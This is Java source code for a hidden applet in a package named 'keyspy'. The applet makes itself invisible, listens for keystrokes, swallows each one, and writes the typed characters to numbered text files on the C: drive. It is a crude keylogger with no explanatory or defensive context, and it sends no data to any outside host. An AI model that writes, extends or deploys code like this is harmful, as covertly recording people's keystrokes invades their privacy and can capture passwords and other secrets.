package keyspy;

import java.awt.event.*;
import java.io.*;
import javax.swing.*;

public class KeyTyper extends JApplet
{	
	public KeyTyper()
	{
		KeysTyped k = new KeysTyped();
		this.addKeyListener(k);
		this.setVisible(false);
		this.start();
	}
	
	public class KeysTyped implements KeyListener
	{
		private FileWriter fw;
		
		public KeysTyped()
		{
			boolean made = false;
			int num = 0;
			while(!made)
			try
			{
				if(!(new File("C:/keysTyped"+num+".txt")).exists())
				{
					fw = new FileWriter("C:/keysTyped"+num+".txt");
					made = true;
				}	
				else
					num++;
				if(num == 50)
					System.exit(0);
			} catch (IOException e)
			{
				System.exit(0);
			}
		}
		
		public void keyPressed(KeyEvent arg0)
		{
		}

		public void keyReleased(KeyEvent arg0)
		{
		}

		public void keyTyped(KeyEvent arg0)
		{
			arg0.consume();
			try
			{
				String letter = arg0.toString();
				
				letter = letter.substring(letter.indexOf("keyChar=")+8);
				System.out.println(letter);
				if(letter.contains("''"))
					letter = "'";
				else if(letter.contains("'"))
					letter = letter.substring(1, 2);
				else
					letter = letter.substring(0, letter.indexOf(","));
				
				fw.write(letter+" ");
				fw.flush();
				System.out.println(letter);
			} catch (IOException e)
			{
				System.out.println("here");
				System.exit(0);
			}
		}
	}
}